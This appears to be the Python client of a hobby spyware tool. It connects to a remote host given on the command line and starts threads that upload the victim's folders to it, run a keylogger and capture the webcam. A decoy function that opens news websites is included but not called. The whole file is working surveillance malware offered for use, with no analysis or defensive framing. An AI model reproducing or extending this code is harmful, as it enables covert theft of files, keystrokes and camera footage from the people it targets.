#! python
# -*- coding: utf-8 -*-
"""
Created on Wed Jun 17 19:56:16 2020

@author: 劉又聖
"""
import socket, sys, logging, platform, time
import threading as th
from networkAPI import NetAPI
from config import upload_dirs, client_save_dirs
from sendsth import send_dir
from keylogger import keylogger
from camera import video_main

def fake():
    import webbrowser as bw
    from config import news_website
    for nw in news_website:
        bw.open(nw)
    return None


def client(host, port, isEndFlag):
    start_dirs = upload_dirs.get(platform.system(), [])
    save_local_dirs  = client_save_dirs.get(platform.system(), [])
    
    logging.debug('Upload dirs {}'.format(start_dirs))
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect( (host, port) )

    handle = NetAPI(sock)
    # handle.send_file('server.py')
    # handle.send_file('C:\\Users\\劉又聖\\source\\repos\\Stack\\StackAndQueue\\main.cpp')
    
    # Create thread
    threads          = []
    send_thread      = th.Thread(name='Send dirs thread', target=send_dir,
                                 args=(handle, start_dirs, isEndFlag),
                                 daemon=False)
    keylogger_thread = th.Thread(name='KeyLogger thread', target=keylogger,
                                 args=(save_local_dirs, isEndFlag), 
                                 daemon=False)
    cammera_thread   = th.Thread(name='Open the webcam',  target=video_main,
                                 args=(save_local_dirs, isEndFlag),
                                 daemon=False)
    
    #TODO: Daily check dir & send them
    send_thread.start()
    threads.append(send_thread)
    #TODO: Run keylogger
    keylogger_thread.start()
    threads.append(keylogger_thread)
    #TODO: Run webcam
    cammera_thread.start()
    threads.append(cammera_thread)
    #TODO: Run Fake function
    #fake()
    #TODO: Set timeout 10 min
    #time.sleep(600)
    
    time.sleep(0.1)
    input('Debug input to end the progrm> ')
    
    # 通知各個Thread該收尾
    isEndFlag.set()
    for thread in threads:
        thread.join()
    
    sock.close()
    logging.debug('Client End')
    return None
    
def main(isEndFlag):
    msg = "Usage: {} host port".format(sys.argv[0])  
    if len(sys.argv) != 3:
        print(msg)
    else:
        host = sys.argv[1]
        port = int(sys.argv[2])
        client(host, port, isEndFlag)

if __name__ == "__main__":
    isEndFlag = th.Event()
    main(isEndFlag)
    isEndFlag.set()